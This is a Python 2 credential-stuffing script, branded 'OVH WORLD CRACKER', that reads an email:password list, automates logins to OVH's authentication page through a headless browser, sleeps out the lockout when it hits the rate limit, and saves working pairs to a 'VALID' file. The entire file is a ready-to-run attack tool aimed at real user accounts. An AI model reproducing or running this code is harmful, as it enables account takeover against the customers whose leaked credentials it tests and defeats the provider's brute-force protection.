#!/usr/bin/python
# -*- coding: utf-8 -*-

# ( -- IMPORTS -- ) #
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)
import time

# ( -- COLORAMA COLORS -- ) #
rd = Fore.RED
cy = Fore.CYAN
wh = Fore.WHITE
gr = Fore.GREEN
yl = Fore.YELLOW
mg = Fore.MAGENTA
bl = Fore.BLACK

# ( -- LOGO * INFO -- ) #
bugs = '''{} {}
   ____  ____  _   _  ____ ____         ____ ____      _    ____ _  _______ ____  
  / __ \| __ )| | | |/ ___/ ___|       / ___|  _ \    / \  / ___| |/ / ____|  _ \ 
 / / _` |  _ \| | | | |  _\___ \ _____| |   | |_) |  / _ \| |   | ' /|  _| | |_) |
| | (_| | |_) | |_| | |_| |___) |_____| |___|  _ <  / ___ \ |___| . \| |___|  _ < 
 \ \__,_|____/ \___/ \____|____/       \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\
|                                                                          
 [$] BUGS OVH WORLD CRACKER.
 [$] URL = ('https://www.Brazzers.com/').
 [$] SCRIPT PROGRAMMED BY BUGS WITH PYTHON2.
'''.format(mg, mg)
#################################
# ( -- PROGRAMMED BY @BUGS -- ) #
#################################

# ( -- FULL API SCRIPT -- ) #

print bugs
print '\n{} {}[+] OVH WORLD CRACKER [+]'.format(cy, cy)
print ''
# ---------------------------------- ## ---------------------------------- ## ---------------------------------- #
list = raw_input('{} {}[X] ENTER YOUR LIST PATH X> '.format(cy, cy))
count = 0
# ---------------------------------- ## ---------------------------------- ## ---------------------------------- #
file = open(list,'r').readlines()
driver = webdriver.PhantomJS("C:\\Selenium\\Phantom\\phantomjs-2.1.1-windows\\phantomjs-2.1.1-windows\\bin\\phantomjs.exe")
#driver = webdriver.Chrome("C:\\Selenium\\Chrome\\chromedriver.exe")
for line in file:
	count = count + 1
	line = line.strip()
	line = line.split(':')
	email = line[0]
	passwd = line[1]
	driver.get('https://www.ovh.com/auth/')
	if 'Too many authentication failures' in driver.page_source:
		print '{} {}[+] '.format(yl, yl) + '(' + str(count) + ') ' + ' => [ + BANNED + ]'.format(yl, yl)
		time.sleep(500)
		driver.get('https://www.ovh.com/auth/')
	else:
		driver.find_element_by_xpath('//*[@class="pagination-centered"]/div/div/input').send_keys(email)
		driver.find_element_by_xpath('//*[@class="pagination-centered"]/div[2]/div/input').send_keys(passwd)
		driver.find_element_by_xpath('//button[@class="btn"]').click()
		if 'Invalid Account ID or password' in driver.page_source:
			print '{} {}[+] '.format(rd, rd) + '(' + str(count) + ') ' + email + ':' + passwd + ' => [ + INVALID + ]'.format(rd, rd)
		else:
			print '{} {}[+] '.format(gr, gr) + '(' + str(count) + ') ' + email + ':' + passwd + ' => [ + VALID + ]'.format(gr, gr)
			valid = open('VALID_OVH.txt', 'a+')
			valid.write('[+] [ ' + email + ':' + passwd + ' ] => [ + VALID + ] \n')
			valid.close()
			time.sleep(5)
			driver.find_element_by_xpath('//span[@class="oui-icon navbar-icon-user"]').click()
			driver.find_element_by_xpath('//button[@class="oui-navbar-link"]').click()
# ---------------------------------- ## ---------------------------------- ## ---------------------------------- #